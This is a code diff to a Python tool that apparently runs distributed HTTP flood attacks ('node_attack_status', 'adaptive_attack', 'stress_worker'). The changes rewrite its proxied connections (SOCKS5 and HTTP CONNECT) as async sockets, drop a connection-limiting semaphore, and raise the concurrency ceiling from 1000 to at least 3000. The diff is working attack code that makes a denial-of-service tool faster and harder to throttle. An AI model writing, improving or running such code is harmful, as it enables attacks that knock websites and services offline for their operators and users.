@@ -15,6 +15,13 @@ from datetime import datetime
 import getpass
 
 try:
+    import termios
+    import tty
+    _HAS_TERMIOS = True
+except ImportError:
+    _HAS_TERMIOS = False
+
+try:
     sys.stdin.reconfigure(encoding='utf-8', errors='replace')
     sys.stdout.reconfigure(encoding='utf-8', errors='replace')
     sys.stderr.reconfigure(encoding='utf-8', errors='replace')
@@ -80,7 +87,7 @@ async def interruptible_sleep(seconds):
 
 NODE_SCRIPT = r'''#!/usr/bin/env python3
 import asyncio, ssl, random, string, sys, json, time, os, signal, base64
-import socket as _socket, ipaddress as _ipaddress, concurrent.futures, threading
+import socket as _socket, ipaddress as _ipaddress, threading
 from urllib.parse import urlparse
 
 STATUS_FILE = "/tmp/node_attack_status.json"
@@ -220,32 +227,45 @@ def pick_proxy():
     return None
 
 
-def _sync_connect(proxy, host, port, use_ssl, timeout):
+async def _async_connect(proxy, host, port, timeout):
+    loop = asyncio.get_running_loop()
+
     if proxy is None:
-        s = _socket.create_connection((host, port), timeout=timeout)
-        s.setblocking(False)
-        return s
+        sock = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
+        sock.setblocking(False)
+        try:
+            await asyncio.wait_for(loop.sock_connect(sock, (host, port)),
+                                   timeout=timeout)
+        except Exception:
+            try:
+                sock.close()
+            except Exception:
+                pass
+            raise
+        return sock
 
     scheme, phost, pport, puser, ppwd = proxy
-    s = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
+    sock = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
+    sock.setblocking(False)
     try:
-        s.settimeout(timeout)
-        s.connect((phost, pport))
+        await asyncio.wait_for(loop.sock_connect(sock, (phost, pport)),
+                               timeout=timeout)
 
         if scheme == "socks5":
             if puser:
-                s.sendall(b"\x05\x02\x00\x02")
+                await asyncio.wait_for(loop.sock_sendall(sock, b"\x05\x02\x00\x02"), timeout=timeout)
             else:
-                s.sendall(b"\x05\x01\x00")
-            hdr = s.recv(2)
+                await asyncio.wait_for(loop.sock_sendall(sock, b"\x05\x01\x00"), timeout=timeout)
+            hdr = await asyncio.wait_for(loop.sock_recv(sock, 2), timeout=timeout)
             if len(hdr) != 2 or hdr[0] != 0x05:
                 raise Exception("socks5: bad greeting")
             method = hdr[1]
             if method == 0x02:
                 u = (puser or "").encode()
                 pw = (ppwd or "").encode()
-                s.sendall(bytes([0x01, len(u)]) + u + bytes([len(pw)]) + pw)
-                auth = s.recv(2)
+                payload = bytes([0x01, len(u)]) + u + bytes([len(pw)]) + pw
+                await asyncio.wait_for(loop.sock_sendall(sock, payload), timeout=timeout)
+                auth = await asyncio.wait_for(loop.sock_recv(sock, 2), timeout=timeout)
                 if len(auth) != 2 or auth[1] != 0x00:
                     raise Exception("socks5: auth failed")
             elif method != 0x00:
@@ -261,19 +281,19 @@ def _sync_connect(proxy, host, port, use_ssl, timeout):
                 addr = bytes([len(hb)]) + hb
 
             req = bytes([0x05, 0x01, 0x00, atyp]) + addr + port.to_bytes(2, "big")
-            s.sendall(req)
-            resp = s.recv(4)
+            await asyncio.wait_for(loop.sock_sendall(sock, req), timeout=timeout)
+            resp = await asyncio.wait_for(loop.sock_recv(sock, 4), timeout=timeout)
             if len(resp) < 4 or resp[1] != 0x00:
                 code = resp[1] if len(resp) > 1 else -1
                 raise Exception(f"socks5: connect failed code={code}")
             if resp[3] == 0x01:
-                s.recv(6)
+                await asyncio.wait_for(loop.sock_recv(sock, 6), timeout=timeout)
             elif resp[3] == 0x03:
-                ln = s.recv(1)
+                ln = await asyncio.wait_for(loop.sock_recv(sock, 1), timeout=timeout)
                 if ln:
-                    s.recv(ln[0] + 2)
+                    await asyncio.wait_for(loop.sock_recv(sock, ln[0] + 2), timeout=timeout)
             elif resp[3] == 0x04:
-                s.recv(18)
+                await asyncio.wait_for(loop.sock_recv(sock, 18), timeout=timeout)
 
         elif scheme in ("http", "https"):
             req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n"
@@ -281,11 +301,11 @@ def _sync_connect(proxy, host, port, use_ssl, timeout):
                 token = base64.b64encode(f"{puser}:{ppwd or ''}".encode()).decode()
                 req += f"Proxy-Authorization: Basic {token}\r\n"
             req += "Proxy-Connection: keep-alive\r\n\r\n"
-            s.sendall(req.encode())
+            await asyncio.wait_for(loop.sock_sendall(sock, req.encode()), timeout=timeout)
 
             buf = b""
             while b"\r\n\r\n" not in buf:
-                chunk = s.recv(1024)
+                chunk = await asyncio.wait_for(loop.sock_recv(sock, 1024), timeout=timeout)
                 if not chunk:
                     raise Exception("http-proxy: closed")
                 buf += chunk
@@ -295,11 +315,10 @@ def _sync_connect(proxy, host, port, use_ssl, timeout):
                 line = buf.split(b"\r\n", 1)[0].decode(errors="ignore")
                 raise Exception(f"http-proxy: {line}")
 
-        s.setblocking(False)
-        return s
+        return sock
     except Exception:
         try:
-            s.close()
+            sock.close()
         except Exception:
             pass
         raise
@@ -314,9 +333,7 @@ class Session:
     async def connect(self):
         await self.close()
         self.proxy = pick_proxy() if PROXIES else None
-        sock = await asyncio.to_thread(
-            _sync_connect, self.proxy, HOST, PORT, USE_SSL, 10
-        )
+        sock = await _async_connect(self.proxy, HOST, PORT, 10)
         if USE_SSL:
             ctx = ssl.create_default_context()
             ctx.check_hostname = False
@@ -412,9 +429,6 @@ class Session:
         return code
 
 
-CONNECT_SEM = None
-
-
 async def worker(worker_id):
     delay = (1.0 / RPS) if RPS and RPS > 0 else 0.0
     session = Session()
@@ -423,24 +437,14 @@ async def worker(worker_id):
     while RUNNING[0]:
         try:
             if not connected:
-                if CONNECT_SEM is not None:
-                    async with CONNECT_SEM:
-                        try:
-                            await session.connect()
-                            connected = True
-                            CONNECTED_COUNT[0] += 1
-                        except Exception as e:
-                            ERROR_COUNT[0] += 1
-                            if ERROR_COUNT[0] % 500 == 0:
-                                log(f"connect#{ERROR_COUNT[0]}: {type(e).__name__}: {str(e)[:60]}")
-                else:
-                    try:
-                        await session.connect()
-                        connected = True
-                        CONNECTED_COUNT[0] += 1
-                    except Exception:
-                        ERROR_COUNT[0] += 1
-                if not connected:
+                try:
+                    await session.connect()
+                    connected = True
+                    CONNECTED_COUNT[0] += 1
+                except Exception as e:
+                    ERROR_COUNT[0] += 1
+                    if ERROR_COUNT[0] % 500 == 0:
+                        log(f"connect#{ERROR_COUNT[0]}: {type(e).__name__}: {str(e)[:60]}")
                     await asyncio.sleep(0.2)
                     continue
 
@@ -502,18 +506,6 @@ async def worker(worker_id):
 
 
 async def main():
-    global CONNECT_SEM
-
-    try:
-        thread_count = min(max(WORKERS, 64), 500)
-        loop = asyncio.get_running_loop()
-        executor = concurrent.futures.ThreadPoolExecutor(max_workers=thread_count)
-        loop.set_default_executor(executor)
-    except Exception as e:
-        log(f"executor setup fail: {e}")
-
-    CONNECT_SEM = asyncio.Semaphore(min(max(WORKERS // 4, 64), 300))
-
     try:
         with open(PID_FILE, "w") as f:
             f.write(str(os.getpid()))
@@ -705,6 +697,7 @@ class LiveDashboard:
         self._last_rps = 0
         self._last_size = (0, 0)
         self._last_line_count = 0
+        self._old_termios = None
 
     @staticmethod
     def _term_size():
@@ -748,6 +741,7 @@ class LiveDashboard:
         self._last_rps = 0
         self._last_size = (0, 0)
         self._last_line_count = 0
+        self._old_termios = None
 
         if not self._is_tty:
             self.enabled = False
@@ -755,6 +749,14 @@ class LiveDashboard:
             return
 
         try:
+            if _HAS_TERMIOS:
+                try:
+                    if sys.stdin.isatty():
+                        self._old_termios = termios.tcgetattr(sys.stdin.fileno())
+                        tty.setcbreak(sys.stdin.fileno())
+                except Exception:
+                    self._old_termios = None
+
             sys.stdout.write("\033[?1049h")
             sys.stdout.write("\033[?25l")
             sys.stdout.write("\033[2J\033[H")
@@ -766,8 +768,23 @@ class LiveDashboard:
     def stop(self):
         self.enabled = False
         if not self._active:
+            if _HAS_TERMIOS and self._old_termios is not None:
+                try:
+                    termios.tcsetattr(sys.stdin.fileno(),
+                                      termios.TCSADRAIN, self._old_termios)
+                except Exception:
+                    pass
+                self._old_termios = None
             return
         try:
+            if _HAS_TERMIOS and self._old_termios is not None:
+                try:
+                    termios.tcsetattr(sys.stdin.fileno(),
+                                      termios.TCSADRAIN, self._old_termios)
+                except Exception:
+                    pass
+                self._old_termios = None
+
             sys.stdout.write("\033[?25h")
             sys.stdout.write("\033[?1049l")
             sys.stdout.flush()
@@ -2188,6 +2205,9 @@ async def adaptive_attack(worker_func, target_url, initial_concurrency,
                           max_concurrency, min_concurrency, duration,
                           stats, use_proxy=False, safe_mode=False,
                           rps=DEFAULT_RPS):
+    if initial_concurrency > max_concurrency:
+        max_concurrency = initial_concurrency * 2
+
     connector = aiohttp.TCPConnector(
         limit=0,
         limit_per_host=0,
@@ -2481,8 +2501,9 @@ async def run_benchmark(target_url, concurrency, duration, use_proxy,
                         safe_mode=False, rps=DEFAULT_RPS, _return_stats=False):
     stats = {"requests": 0, "success": 0, "rate_limit": 0, "blocked": 0,
              "server_error": 0, "timeouts": 0, "dropped": 0, "other": 0}
+    dyn_max = max(concurrency * 2, 3000)
     stats = await adaptive_attack(stress_worker, target_url, concurrency,
-                                  max_concurrency=1000, min_concurrency=50,
+                                  max_concurrency=dyn_max, min_concurrency=50,
                                   duration=duration, stats=stats,
                                   use_proxy=use_proxy, safe_mode=safe_mode,
                                   rps=rps)
